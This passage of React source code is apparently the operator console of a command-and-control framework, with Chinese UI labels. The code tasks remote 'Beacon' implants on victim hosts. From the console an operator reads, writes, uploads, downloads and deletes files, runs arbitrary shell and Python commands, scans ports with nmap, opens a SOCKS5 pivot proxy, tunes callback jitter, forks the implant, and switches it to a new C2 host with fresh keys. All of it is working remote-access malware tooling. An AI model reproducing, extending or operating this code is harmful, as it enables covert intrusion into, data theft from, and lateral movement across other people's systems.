        setFileEdit(data.text || '')
        setFileMode('view')
        setFileMsg(data.truncated ? '文件已读取 · Beacon 已获取任务 · 内容已截断' : '文件已读取 · Beacon 已获取任务')
      }
    } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
  }
  const saveSelectedFile = async () => {
    if (!selectedFile?.path || selectedFile.binary) return
    setBusy(true); setFileMsg('')
    try {
      const taskRecord = await action('file.write', { beacon_id: beacon.id, path: selectedFile.path, content: fileEdit })
      setFileMsg(`任务已下发 · ${taskRecord.id} · 等待 Beacon 领取…`)
      const task = await waitTask(taskRecord.id, state => {
        if (state.status === 'dispatched') setFileMsg('Beacon 已获取任务 · 正在写入文件…')
      })
      if (task.timedOut) setFileMsg(`等待超时 · 当前状态：${task.status || 'unknown'} · 请检查 Beacon 是否在线`)
      else {
        setSelectedFile(prev => ({ ...prev, text: fileEdit }))
        setFileMsg(`已保存 ${selectedFile.path} · ${task.output || task.status}`)
        await loadDir(path)
      }
    } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
  }
  const openCreateFile = () => {
    setCreateFileDir(path || '.')
    setCreateFileName('')
    setCreateFileContent('')
    setCreateFileBusy(false)
    setCreateFileOpen(true)
  }
  const createTargetFile = async () => {
    const name = createFileName.trim()
    if (!name) { setFileMsg('请输入文件名'); return }
    const dir = (createFileDir.trim() || '.').replace(/\/+$/, '')
    const targetPath = dir === '/' ? `/${name.replace(/^\/+/, '')}` : `${dir}/${name.replace(/^\/+/, '')}`
    setCreateFileBusy(true); setFileMsg('')
    try {
      const taskRecord = await action('file.write', { beacon_id: beacon.id, path: targetPath, content: createFileContent, mode: 'overwrite' })
      const task = await waitTask(taskRecord.id, state => {
        if (state.status === 'dispatched') setFileMsg(`Beacon 已获取任务 · 正在创建 ${targetPath}`)
      })
      if (task.timedOut) throw new Error(`创建文件等待超时：${taskRecord.id}`)
      if (task.status !== 'succeeded') throw new Error(task.error || `创建文件失败：${task.status || 'unknown'}`)
      setCreateFileOpen(false)
      setSelectedFile({ path: targetPath, name, text: createFileContent, binary: false, content_b64: '', truncated: false })
      setFileEdit(createFileContent)
      setFileMode('view')
      setPath(dir || '.')
      await loadDir(dir || '.')
      setFileMsg(`文件已创建：${targetPath}`)
    } catch (err) { setFileMsg(err.message) } finally { setCreateFileBusy(false) }
  }
  const openDeleteFile = () => {
    if (!selectedFile?.path) { setFileMsg('请先选择要删除的文件'); return }
    setDeleteFileOpen(true)
  }
  const deleteSelectedFile = async () => {
    if (!selectedFile?.path) return
    const target = selectedFile
    setDeleteFileBusy(true); setFileMsg('')
    try {
      const taskRecord = await action('task.create', { beacon_id: beacon.id, plugin: 'rm', args: { path: target.path, recursive: false } })
      const task = await waitTask(taskRecord.id, state => {
        if (state.status === 'dispatched') setFileMsg(`Beacon 正在删除：${target.path}`)
      })
      if (task.timedOut) throw new Error(`删除等待超时：${taskRecord.id}`)
      if (task.status !== 'succeeded') throw new Error(task.error || `删除失败：${task.status || 'unknown'}`)
      setDeleteFileOpen(false)
      setSelectedFile(null)
      setFileEdit('')
      setFileMode('view')
      await loadDir(path)
      setFileMsg(`已删除：${target.path}`)
    } catch (err) { setFileMsg(err.message) } finally { setDeleteFileBusy(false) }
  }
  const uploadToTarget = async (upload) => {
    if (!upload) return
    setBusy(true); setFileMsg(`上传 ${upload.name} …`)
    const targetPath = `${path}/${upload.name}`.replace(/\/+/g, '/')
    const chunkSize = 8 * 1024
    try {
      let offset = 0
      do {
        const chunk = upload.slice(offset, offset + chunkSize)
        const content_b64 = await blobToBase64(chunk)
        const result = await action('file.upload_chunk', {
          beacon_id: beacon.id, path: targetPath, offset,
          mode: offset === 0 ? 'start' : 'append', content_b64,
        })
        const task = await waitTask(result.task.id, state => {
          if (state.status === 'dispatched') setFileMsg(`上传 ${upload.name}: Beacon 正在写入 ${offset + chunk.size}/${upload.size} B`)
        })
        if (task.timedOut) throw new Error(`上传分块等待超时：${result.task.id}`)
        if (task.status !== 'succeeded') throw new Error(task.error || `上传分块失败：${task.status || 'unknown'}`)
        offset += chunk.size
        setFileMsg(`上传 ${upload.name}: ${offset}/${upload.size} B`)
      } while (offset < upload.size)
      await loadDir(path)
      setFileMsg(`上传完成：${targetPath} (${upload.size} B)`)
    } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
  }
  const downloadSelected = async () => {
    if (!selectedFile?.path) return
    setBusy(true); setFileMsg(`下载 ${selectedFile.path} …`)
    try {
      const chunks = []
      let offset = 0
      let chunkCount = 0
      while (true) {
        if (++chunkCount > 4096) throw new Error('下载分块超过上限，已中止')
        const taskRecord = await action('file.download', { beacon_id: beacon.id, path: selectedFile.path, offset, length: 1024 * 1024 })
        const task = await waitTask(taskRecord.id)
        if (task.timedOut) throw new Error('下载任务等待超时')
        const data = normalizeTaskData(task)
        if (data.content_b64) {
          const raw = atob(data.content_b64)
          const bytes = new Uint8Array(raw.length)
          for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)
          chunks.push(bytes)
        }
        const advanced = Number(data.length || 0)
        if (!advanced && !data.eof) throw new Error('服务端返回 0 字节但未到达文件末尾，已中止下载')
        offset += advanced
        setFileMsg(`下载 ${selectedFile.path}: ${offset} B`)
        if (data.eof || !advanced) break
      }
      const blob = new Blob(chunks, { type: 'application/octet-stream' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url; a.download = selectedFile.name || 'download.bin'; a.click()
      URL.revokeObjectURL(url)
      setFileMsg(`下载完成：${selectedFile.path} (${offset} B)`)
    } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
  }

  const displayOutput = (entry) => {
    const pattern = entry.localFilter || (filter.mode === 'sticky' ? filter.pattern : filter.mode === 'current' && filter.ids?.includes(entry.id) ? filter.pattern : '')
    if (!pattern) return entry.output
    const filtered = filterText(entry.output, pattern)
    return filtered || '[无匹配行]'
  }
  const addOutput = (entry) => {
    setOutputs(prev => [...prev, nextFilter ? { ...entry, localFilter: nextFilter } : entry])
    if (nextFilter) setNextFilter('')
  }
  const updateOutput = (id, output) => setOutputs(prev => prev.map(item => item.id === id ? { ...item, output } : item))
  const updateOutputTaskId = (id, taskId) => setOutputs(prev => prev.map(item => item.id === id ? { ...item, taskId } : item))
  const updateTaskStatus = (id, status) => setOutputs(prev => prev.map(item => {
    if (item.id !== id) return item
    const parts = item.status ? item.status.split(' → ') : []
    return parts.includes(status) ? item : { ...item, status: [...parts, status].join(' → ') }
  }))

  const trackCommandTask = async (entryId, taskRecord) => {
    const taskId = taskRecord?.id || taskRecord?.task_id || ''
    setParallelTaskCount(count => count + 1)
    updateOutputTaskId(entryId, taskId)
    updateTaskStatus(entryId, `已下发 · ${taskId}`)
    updateOutput(entryId, '等待 Beacon 回连领取任务…')
    try {
      const done = await waitTask(taskId, state => {
        if (state.status === 'dispatched') {
          updateTaskStatus(entryId, `Beacon 已获取 · ${taskId}`)
          updateOutput(entryId, 'Beacon 正在执行…')
        } else if (state.status === 'queued') {
          updateTaskStatus(entryId, `排队中 · ${taskId}`)
        }
      })
      if (done.timedOut) {
        updateTaskStatus(entryId, `等待超时 · ${done.status || 'unknown'}`)
        updateOutput(entryId, 'Beacon 未领取任务，请检查 Beacon 是否在线或回连间隔。')
      } else if (done.status === 'succeeded') {
        updateTaskStatus(entryId, `执行完成 · ${done.status}`)
        updateOutput(entryId, formatTaskOutput(done))
      } else {
        updateTaskStatus(entryId, `执行${done.status === 'cancelled' ? '取消' : '失败'} · ${done.status || 'unknown'}`)
        updateOutput(entryId, done.error || formatTaskOutput(done))
      }
    } catch (err) {
      updateTaskStatus(entryId, '轮询失败')
      updateOutput(entryId, err.message)
    } finally {
      setParallelTaskCount(count => Math.max(0, count - 1))
    }
  }

  const runCommand = async (raw = input) => {
    const cmdline = String(raw || '').trim()
    if (!cmdline) return
    const parsed = commandArgs(cmdline, path)
    const cmd = parsed.cmd
    const args = parsed.args
    const entryId = crypto.randomUUID ? `local-${crypto.randomUUID()}` : `local-${Date.now()}-${Math.random().toString(16).slice(2)}`
    const entry = { id: entryId, cmd: cmdline, output: '正在创建任务…', status: '' }
    addOutput(entry); setInput(''); setShowSuggest(false)
    await recordHistory(cmdline, 'command')
    if (cmd === 'proxy' || cmd === 'socks') {
      setBusy(true)
      try {
        const tokens = parseCommandLine(cmdline).tokens
        const sub = String(tokens[1] || 'info').toLowerCase()
        let data
        if (sub === 'start') data = await action('proxy.start', { beacon_id: beacon.id, port: Number(tokens[2] || 1080) })
        else if (sub === 'stop') data = await action('proxy.stop', {})
        else data = await action('proxy.info', {})
        if (data?.status === 'approval_required') updateOutput(entry.id, `需要审批：${data.approval?.id || ''}`)
        else if (sub === 'start') updateOutput(entry.id, `SOCKS5 已启动\n监听: 0.0.0.0:${data.port}\n用户名: ${data.username} 或目标 Beacon ID\n密码: ${data.password}\n活动会话: ${data.active_sessions || 0}`)
        else if (sub === 'stop') updateOutput(entry.id, `SOCKS5 已停止\n端口: ${data.port}`)
        else updateOutput(entry.id, JSON.stringify(data, null, 2))
      } catch (err) { updateOutput(entry.id, err.message) } finally { setBusy(false) }
      return
    }
    try {
      const task = await action('task.create', { beacon_id: beacon.id, plugin: cmd, args })
      void trackCommandTask(entry.id, task)
    } catch (err) {
      updateOutput(entry.id, err.message)
      updateTaskStatus(entry.id, '下发失败')
    }
  }

  const stopQueue = async () => {
    setStopBusy(true); setQueueMsg('')
    try {
      const result = await action('beacon.stop_queue', { beacon_id: beacon.id })
      setQueueMsg(`已清空等待队列：${result?.cancelled_count ?? 0} 条任务；已下发任务不受影响`)
      await loadTaskHistory()
    } catch (err) { setQueueMsg(err.message) } finally { setStopBusy(false) }
  }

  const sendPython = async () => {
    const source = pyScript.trim()
    if (!source) return
    const label = `python ${pyName || 'script'}`
    const entry = { id: `py-${Date.now()}`, cmd: label, output: '正在创建脚本任务…', status: '' }
    addOutput(entry); setBusy(true)
    await recordHistory(label, 'python')
    try {
      const task = await action('script.run', { beacon_id: beacon.id, source: pyScript })
      updateOutputTaskId(entry.id, task.id)
      updateTaskStatus(entry.id, `已下发 · ${task.id}`)
      updateOutput(entry.id, '等待 Beacon 回连领取任务…')
      const done = await waitTask(task.id, state => {
        if (state.status === 'dispatched') {
          updateTaskStatus(entry.id, `Beacon 已获取任务 · ${task.id}`)
          updateOutput(entry.id, 'Beacon 正在执行脚本…')
        }
      })
      if (done.timedOut) {
        updateTaskStatus(entry.id, `等待超时 · ${done.status || 'unknown'}`)
        updateOutput(entry.id, 'Beacon 未领取任务，请检查 Beacon 是否在线或回连间隔。')
      } else {
        updateTaskStatus(entry.id, `已完成 · ${done.status || 'unknown'}`)
        updateOutput(entry.id, done.output || done.error || JSON.stringify(done.result || {}))
      }
    } catch (err) { updateOutput(entry.id, err.message) } finally { setBusy(false) }
  }
  const savePythonTemplate = async () => {
    setTemplateMsg('')
    try {
      const data = await localFetch('/api/local/templates', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: pyName || 'script', source: pyScript }),
      })
      if (!data.ok) throw new Error(data.error || '保存失败')
      const savedName = data.template?.name || data.file
      setTemplateMsg(`模板已保存：${savedName}`)
      setTemplateName(savedName)
      await loadTemplates()
    } catch (err) { setTemplateMsg(err.message) }
  }
  const applyTemplate = (name) => {
    const found = templates.find(item => item.name === name)
    if (!found) return
    setTemplateName(name); setPyName(found.name); setPyScript(found.source)
    setTemplateMsg(`已加载模板：${found.file}`)
  }
  const deleteTemplate = async () => {
    if (!templateName) return
    try {
      await localFetch(`/api/local/templates/${encodeURIComponent(templateName)}`, { method: 'DELETE' })
      setTemplateMsg(`已删除模板：${templateName}`); setTemplateName(''); await loadTemplates()
    } catch (err) { setTemplateMsg(err.message) }
  }
  const clearHistory = async () => {
    await localFetch('/api/local/history', { method: 'DELETE' })
    await loadHistory()
  }

  const quickModules = [
    { id: 'system', label: '系统', items: [
      { label: '系统信息', command: 'sysinfo', description: '获取系统名称、内核版本和架构信息。', params: [] },
      { label: '进程列表', command: 'ps', description: '列出当前主机上的进程。', params: [] },
      { label: '网络连接', command: 'netstat', description: '列出当前网络连接和监听端口。', params: [] },
      { label: '当前目录', command: 'pwd', description: '显示 Beacon 当前工作目录。', params: [] },
      { label: '当前用户', command: 'whoami', description: '显示 Beacon 运行用户。', params: [] },
      { label: '环境变量', command: 'env', description: '显示当前进程环境变量。', params: [] },
    ] },
    { id: 'files', label: '文件', items: [
      { label: '列出目录', command: 'ls', description: '列出目录下的文件、权限、大小和修改时间。', params: [
        { key: 'path', label: '目录路径', hint: '要列出的绝对或相对目录，例如 /tmp。', default: path || '.' },
      ], build: v => `ls ${shellQuote(v.path || path || '.')}` },
      { label: '文件查找', command: 'find', description: '按通配符查找目录中的文件。', params: [
        { key: 'path', label: '搜索目录', hint: '从哪个目录开始查找。', default: path || '.' },
        { key: 'pattern', label: '文件匹配', hint: '通配符或模式，例如 *.log。', default: '*' },
      ], build: v => `find ${shellQuote(v.path || path || '.')} ${shellQuote(v.pattern || '*')}` },
      { label: '文本搜索', command: 'grep', description: '在目录中搜索包含指定文本的文件。', params: [
        { key: 'path', label: '搜索目录', hint: '搜索范围目录。', default: path || '.' },
        { key: 'pattern', label: '搜索文本', hint: '要匹配的文本或正则，例如 root。', default: 'root' },
      ], build: v => `grep ${shellQuote(v.path || path || '.')} ${shellQuote(v.pattern || 'root')}` },
      { label: '读取文件', command: 'cat', description: '读取文本文件内容，超大文件会被传输限制截断。', params: [
        { key: 'path', label: '文件路径', hint: '要读取的完整文件路径，例如 /etc/hosts。', default: '' },
      ], build: v => `cat ${shellQuote(v.path || '')}` },
      { label: '读取文件尾部', command: 'tail', description: '显示文件最后若干行。', params: [
        { key: 'path', label: '文件路径', hint: '要查看的文件路径。', default: '' },
        { key: 'lines', label: '显示行数', hint: '默认 20 行。', default: '20', type: 'number' },
      ], build: v => `tail ${shellQuote(v.path || '')} ${Number(v.lines || 20)}` },
    ] },
    { id: 'network', label: '网络', items: [
      { label: '主机存活', command: 'ping', description: '对目标主机进行连通性探测。', params: [
        { key: 'host', label: '目标主机 / IP', hint: '例如 192.0.2.10 或 example.com。', default: '127.0.0.1' },
      ], build: v => `ping ${shellQuote(v.host || '127.0.0.1')}` },
      { label: '端口扫描', command: 'nmap', description: '扫描目标主机的端口范围。', params: [
        { key: 'host', label: '目标主机 / IP', hint: '要扫描的主机名或 IP。', default: '127.0.0.1' },
        { key: 'ports', label: '端口范围', hint: '例如 1-1024 或 22,80,443。', default: '1-1024' },
      ], build: v => `nmap ${shellQuote(v.host || '127.0.0.1')} ${shellQuote(v.ports || '1-1024')}` },
      { label: '常用端口', command: 'nmap', description: '扫描 22/80/443/445/3389 等常用端口。', params: [
        { key: 'host', label: '目标主机 / IP', hint: '要扫描的主机名或 IP。', default: '127.0.0.1' },
      ], build: v => `nmap ${shellQuote(v.host || '127.0.0.1')} 22,80,443,445,3389` },
    ] },
    { id: 'tools', label: '工具', items: [
      { label: beacon.platform === 'windows' ? 'PowerShell 命令' : 'Bash 命令', command: 'exec', description: '在目标主机执行一条系统命令。', params: [
        { key: 'command', label: 'Shell 命令', hint: '原样传递给目标系统 shell，例如 id 或 whoami。', default: beacon.platform === 'windows' ? 'whoami' : 'id' },
      ], build: v => `exec ${v.command || (beacon.platform === 'windows' ? 'whoami' : 'id')}` },
      { label: '磁盘使用', command: 'df', description: '查看磁盘空间使用情况。', params: [
        { key: 'path', label: '磁盘路径', hint: '要查询的挂载点或路径。', default: '/' },
      ], build: v => `df ${shellQuote(v.path || '/')}` },
      { label: '内存信息', command: 'free', description: '查看系统内存使用情况。', params: [] },
      { label: '当前目录', command: 'pwd', description: '显示 Beacon 当前工作目录。', params: [] },
      { label: '运行中任务', command: 'tasks', description: '查看当前 Beacon 正在执行的任务列表。', params: [] },
      { label: '终止运行任务', command: 'killtask', description: '强制终止指定的正在运行任务。', params: [
        { key: 'task_id', label: '任务 ID', hint: '从“运行中任务”结果中复制的 task_... ID。', default: '' },
      ], build: v => `killtask ${shellQuote(v.task_id || '')}` },
      { label: '回连参数设置', command: 'settings', description: '按需修改快端、慢端、当前间隔、抖动、聚合和并发；留空的参数保持原值。', params: [
        { key: 'min', label: '快端 --min (s)', hint: '最短轮询间隔，例如 3。', default: '', type: 'number' },
        { key: 'max', label: '慢端 --max (s)', hint: '空闲时最长轮询间隔，例如 30。', default: '', type: 'number' },
        { key: 'current', label: '当前 --current (s)', hint: '立即生效的当前轮询间隔。', default: '', type: 'number' },
        { key: 'jitter', label: '抖动 --jitter', hint: '0 到 0.9 之间的抖动比例。', default: '', type: 'number' },
        { key: 'finish', label: '聚合 --finish (s)', hint: '结果聚合等待时间。', default: '', type: 'number' },
        { key: 'concurrency', label: '并发 --concurrency', hint: '最大并发任务数，1 到 64。', default: '', type: 'number' },
      ], build: v => {
        const parts = ['settings']
        for (const key of ['min', 'max', 'current', 'jitter', 'finish', 'concurrency']) {
          if (String(v[key] ?? '').trim() !== '') parts.push(`--${key} ${Number(v[key])}`)
        }
        return parts.join(' ')
      } },
      { label: '协议升级', command: 'upgrade', description: '切换回连 IP/URL、端口和协议，可附带新 Token 与密钥。', params: [
        { key: 'url', label: 'URL（可选）', hint: '例如 https://new-c2.example.com。填写后优先使用 URL 主机和端口。', default: '' },
        { key: 'host', label: 'IP / 主机（可选）', hint: '没有 URL 时填写目标 IP 或主机名。', default: '' },
        { key: 'port', label: '端口', hint: '新监听器端口。', default: '', type: 'number' },
        { key: 'protocol', label: '协议', hint: 'udp / tcp / http / https / dns。', default: 'tcp' },
        { key: 'token', label: '新 Token（可选）', hint: '目标载荷的 payload_token；不填保持当前值。', default: '' },
        { key: 'key', label: '新密钥（可选）', hint: '32 字节密钥的 Base64；不填保持当前值。', default: '' },
      ], build: v => {
        const parts = ['upgrade']
        if (String(v.url || '').trim()) parts.push(`--url ${shellQuote(v.url)}`)
        else if (String(v.host || '').trim()) parts.push(`--host ${shellQuote(v.host)}`)
        if (String(v.port || '').trim()) parts.push(`--port ${Number(v.port)}`)
        if (String(v.protocol || '').trim()) parts.push(`--protocol ${shellQuote(v.protocol)}`)
        if (String(v.token || '').trim()) parts.push(`--token ${shellQuote(v.token)}`)
        if (String(v.key || '').trim()) parts.push(`--key ${shellQuote(v.key)}`)
        return parts.join(' ')
      } },
      { label: '独立 Fork', command: 'fork', description: '派生一个参数完全相同的独立 Beacon 进程；两个进程互不依赖。', params: [] },
    ] },
    { id: 'proxy', label: '代理', items: [
      { label: '启动 SOCKS5', command: 'proxy start', description: '在服务端启动按需 SOCKS5 网关。', params: [
        { key: 'proxyPort', label: 'SOCKS5 端口', hint: '服务端监听端口，默认 1080。', default: '1080', type: 'number' },
      ], build: v => `proxy start ${Number(v.proxyPort || 1080)}` },
      { label: '代理状态', command: 'proxy info', description: '查看当前 SOCKS5 网关状态。', params: [] },
      { label: '停止代理', command: 'proxy stop', description: '停止 SOCKS5 网关。', params: [] },
    ] },
  ]
  const allQuickItems = quickModules.flatMap(module => module.items.map(item => ({ ...item, moduleLabel: module.label })))
  const filteredQuickItems = allQuickItems.filter(item => `${item.label} ${item.command} ${item.description}`.toLowerCase().includes(quickSearch.trim().toLowerCase()))
  const openQuick = (item) => {
    const defaults = {}
    for (const param of item.params || []) defaults[param.key] = param.default ?? ''
    if (!item.params || item.params.length === 0) {
      setQuickDialog(null)
      setTab('terminal')
      setInput(item.command)
      runCommand(item.command)
      return
    }
    setQuickDialog(item)
    setQuickValues(defaults)
  }
  const quickCommand = quickDialog ? (quickDialog.build ? quickDialog.build(quickValues) : quickDialog.command) : ''
  const executeQuick = () => {
    if (!quickDialog) return
    const cmdline = quickDialog.build ? quickDialog.build(quickValues) : quickDialog.command
    setQuickDialog(null)
    setTab('terminal')
    setInput(cmdline)
    runCommand(cmdline)
  }
  const visibleHistory = historyEntries.slice(0, 40)

  const controlPanel = (<>
    <Panel title="Beacon 信息与回连设置" eyebrow="BEACON CONTROL" className="beacon-info-panel" right={<button className="ghost" onClick={loadBeaconInfo}>刷新信息</button>}>
      <div className="beacon-info-grid">
        <div><span>Beacon ID</span><code>{beaconInfo.id}</code></div>
        <div><span>平台 / 协议</span><strong>{beaconInfo.platform} / {beaconInfo.protocol}</strong></div>
        <div><span>用户</span><strong>{beaconInfo.username || '—'}</strong></div>
        <div><span>Python</span><strong>{beaconInfo.python_version || '—'}</strong></div>
        <div><span>当前目录</span><code>{beaconInfo.cwd || '—'}</code></div>
        <div><span>状态</span><strong><Status status={beaconInfo.status} /></strong></div>
        <div><span>移除次数</span><strong>{beaconInfo.reactivation_count || 0}</strong></div>
        <div><span>最近恢复</span><strong>{beaconInfo.last_reactivated_at || '—'}</strong></div>
        <div><span>监听器</span><code>{beaconInfo.listener_id || '—'}</code></div>
        <div><span>载荷</span><code>{beaconInfo.payload_id || '—'}</code></div>
        <div><span>首次上线</span><strong>{beaconInfo.first_seen || '—'}</strong></div>
        <div><span>最后心跳</span><strong>{beaconInfo.last_seen || '—'}</strong></div>
        <div><span>当前心跳间隔</span><strong>{beaconInfo.heartbeat_interval != null ? `${Math.round(beaconInfo.heartbeat_interval)}s` : '—'}</strong></div>
        <div><span>快端 / 慢端</span><strong>{beaconInfo.heartbeat_fast ?? '—'}s / {beaconInfo.heartbeat_slow ?? '—'}s</strong></div>
        <div><span>抖动 / 结果聚合</span><strong>{beaconInfo.heartbeat_jitter ?? '—'} / {beaconInfo.result_finish_delay ?? '—'}s</strong></div>
        <div><span>最大并发任务</span><strong>{beaconInfo.max_concurrent_tasks ?? '—'}</strong></div>
        <div><span>空闲轮数</span><strong>{beaconInfo.heartbeat_idle_rounds ?? 0}</strong></div>
        <div><span>累计下发</span><strong>{beaconInfo.heartbeat_dispatch_total ?? 0}</strong></div>
        <div><span>连续失败</span><strong>{beaconInfo.heartbeat_failures ?? 0}</strong></div>
        <div><span>下次回连</span><strong>{beaconInfo.next_poll_at ? `${Math.max(0, Math.round(beaconInfo.next_poll_at - Date.now() / 1000))}s` : '—'}</strong></div>
      </div>
      <div className="beacon-settings-row">
        <label>快端(s)<input type="number" step="0.5" value={beaconSettings.fast_interval} onChange={e => updateBeaconSetting('fast_interval', e.target.value)} /></label>
        <label>慢端(s)<input type="number" step="1" value={beaconSettings.slow_interval} onChange={e => updateBeaconSetting('slow_interval', e.target.value)} /></label>
        <label>当前(s)<input type="number" step="0.5" value={beaconSettings.current_interval} onChange={e => updateBeaconSetting('current_interval', e.target.value)} /></label>
        <label>抖动<input type="number" step="0.05" min="0" max="0.9" value={beaconSettings.jitter} onChange={e => updateBeaconSetting('jitter', e.target.value)} /></label>
        <label>聚合(s)<input type="number" step="0.5" value={beaconSettings.finish_delay} onChange={e => updateBeaconSetting('finish_delay', e.target.value)} /></label>
        <label>并发<input type="number" step="1" min="1" max="64" value={beaconSettings.max_concurrent_tasks} onChange={e => updateBeaconSetting('max_concurrent_tasks', e.target.value)} /></label>
        <button className="primary" onClick={saveBeaconSettings}>应用 Beacon 设置</button>
      </div>
      {settingsMsg && <div className="hint">{settingsMsg}</div>}
      <div className="beacon-protocol-row protocol-upgrade-form">
        <label>协议<select value={upgradeForm.protocol} onChange={e => setUpgradeForm(prev => ({ ...prev, protocol: e.target.value }))}><option value="udp">UDP</option><option value="tcp">TCP</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option></select></label>
        <label>目标 IP / URL<input value={upgradeForm.target} onChange={e => setUpgradeForm(prev => ({ ...prev, target: e.target.value }))} placeholder="192.0.2.10 或 tcp://host:9001" /></label>
        <label>端口<input type="number" value={upgradeForm.port} onChange={e => setUpgradeForm(prev => ({ ...prev, port: e.target.value }))} placeholder="URL 已带端口可留空" /></label>
        <label>新 Token（可选）<input value={upgradeForm.token} onChange={e => setUpgradeForm(prev => ({ ...prev, token: e.target.value }))} placeholder="留空保持当前 Token" /></label>
        <label>新密钥（可选）<input value={upgradeForm.key} onChange={e => setUpgradeForm(prev => ({ ...prev, key: e.target.value }))} placeholder="Base64 32字节，留空保持当前密钥" /></label>
        <button className="ghost" onClick={upgradeProtocol}>升级协议</button>
        <div className="hint protocol-hint">支持 IP 或 URL；升级会通过 upgrade 插件先在服务端完成密钥握手，再切换回连目标。</div>
        {protocolMsg && <span className="hint protocol-msg">{protocolMsg}</span>}
      </div>
    </Panel>
    <Panel title="Beacon 备注" eyebrow="TARGET NOTES" className="beacon-note-panel">
      <div className="beacon-note-editor">
        <textarea value={beaconNote} onChange={e => { setBeaconNote(e.target.value); setNoteDirty(true) }} placeholder="记录这个 Beacon 是什么主机、什么业务、什么用途、注意事项……" />
        <div className="modal-actions"><span className="hint">{noteDirty ? '有未保存修改' : noteMsg || '备注保存在服务端文件数据库'}</span><button className="primary" onClick={saveBeaconNote}>保存备注</button></div>
      </div>
    </Panel>
    <Panel title="当前排队命令" eyebrow="SERVER EXECUTION QUEUE" className="beacon-queue-panel" right={<div className="quick-buttons"><span className="micro">{taskHistory.filter(task => task.status === 'queued').length} QUEUED</span><button className="ghost danger" onClick={stopQueue} disabled={stopBusy}>急停清空队列</button></div>}>
      <div className="beacon-queue-list">{taskHistory.filter(task => task.status === 'queued').map(task => <div className="beacon-queue-row" key={task.id}><div><strong>{task.display || task.plugin}</strong><small>{task.id} · {task.created_at?.slice(5, 19) || ''}</small></div><pre>{JSON.stringify(task.args || {}, null, 2)}</pre></div>)}{!taskHistory.filter(task => task.status === 'queued').length && <div className="empty">当前没有等待下发的命令</div>}{queueMsg && <div className="hint">{queueMsg}</div>}</div>
    </Panel>
  </>)

  const liveTaskIds = new Set(outputs.map(item => item.taskId).filter(Boolean))
  const serverHistoryEntries = taskHistory.filter(task => !liveTaskIds.has(task.id)).map(task => ({
    id: `history-${task.id}`,
    cmd: task.display || task.plugin || task.id,
    output: task.error || task.output || (task.status === 'queued' ? '等待 Beacon 领取任务…' : `任务状态：${task.status}`),
    status: `${task.auto_sequence ? 'AUTO · ' : ''}${String(task.status || 'unknown').toUpperCase()} · ${task.created_at?.slice(5, 16) || ''}`,
    history: true,
  }))
  const terminalEntries = [...serverHistoryEntries, ...outputs]
  const terminalNearBottom = (element, threshold = 32) => !!element && element.scrollHeight - element.scrollTop - element.clientHeight <= threshold
  const onTerminalScroll = (event) => {
    const element = event.currentTarget
    const top = element.scrollTop
    if (top < terminalScrollRef.current.top - 1) terminalScrollRef.current.follow = false
    else if (terminalNearBottom(element)) terminalScrollRef.current.follow = true
    terminalScrollRef.current.top = top
  }
  useLayoutEffect(() => {
    if (tab !== 'terminal') return
    const element = terminalRef.current
    if (!element) return
    if (terminalScrollRef.current.follow) {
      element.scrollTop = element.scrollHeight
      terminalScrollRef.current.top = element.scrollTop
    } else {
      element.scrollTop = terminalScrollRef.current.top
    }
    return () => { if (terminalRef.current) terminalScrollRef.current.top = terminalRef.current.scrollTop }
  }, [tab])
  useEffect(() => {
    if (tab !== 'terminal') return
    const element = terminalRef.current
    if (!element) return
    const followBottom = () => {
      if (!terminalScrollRef.current.follow) return
      requestAnimationFrame(() => {
        if (terminalRef.current && terminalScrollRef.current.follow) {
          terminalRef.current.scrollTop = terminalRef.current.scrollHeight
          terminalScrollRef.current.top = terminalRef.current.scrollTop
        }
      })
    }
    followBottom()
    const observer = new MutationObserver(followBottom)
    observer.observe(element, { childList: true, subtree: true, characterData: true })
    return () => observer.disconnect()
  }, [tab])

  return <div className="page beacon-page">
    <header className="page-head"><div><button className="link" onClick={onBack}>← 返回</button><div className="eyebrow">BEACON WORKSPACE</div><h1>{beacon.hostname}<span>_</span></h1><p>{beacon.id} · {beacon.platform} · {beacon.protocol} · {beacon.username}</p></div><Status status={beacon.status} /></header>
    {beaconInfo.status !== 'online' && <Banner text="Beacon 当前离线：任务不会立即执行。请等待心跳恢复后再下发，或重新生成载荷上线。" tone="error" />}
    <div className="workspace-tabs"><button className={tab === 'terminal' ? 'active' : ''} onClick={() => setTab('terminal')}>⌘ 命令界面</button><button className={tab === 'files' ? 'active' : ''} onClick={() => setTab('files')}>▤ 文件编辑界面</button><button className={tab === 'control' ? 'active' : ''} onClick={() => setTab('control')}>◈ Beacon 控制</button></div>
    {tab === 'terminal' ? <div className="command-workspace">
      <div className="command-main">
        <Panel title="命令终端" eyebrow="EXECUTION" right={<span className="micro">{beacon.protocol} · {beacon.platform}</span>} className="terminal-panel">
          <LineFilter entries={outputs} filter={filter} setFilter={setFilter} nextFilter={nextFilter} setNextFilter={setNextFilter} />
          <div className="terminal" ref={terminalRef} onScroll={onTerminalScroll}>{terminalEntries.map(entry => <div key={entry.id} className={`terminal-entry ${entry.history ? 'history-entry' : ''}`}><div className="cmdline"><span>{entry.history ? '↺' : 'λ'}</span><code>{entry.cmd}</code></div>{entry.status && <div className="task-status">{entry.status}</div>}<pre>{displayOutput(entry)}</pre></div>)}{parallelTaskCount > 0 && <div className="terminal-entry"><div className="cmdline"><span>◌</span><code>并行任务 {parallelTaskCount} 个执行中…</code></div></div>}</div>
          <div className="cmd-input-wrap">
            {showSuggest && suggestions.length > 0 && <div className="suggestions">{suggestions.map(s => <button key={s} onClick={() => { setInput(s + ' '); setShowSuggest(false) }}>{s}</button>)}</div>}
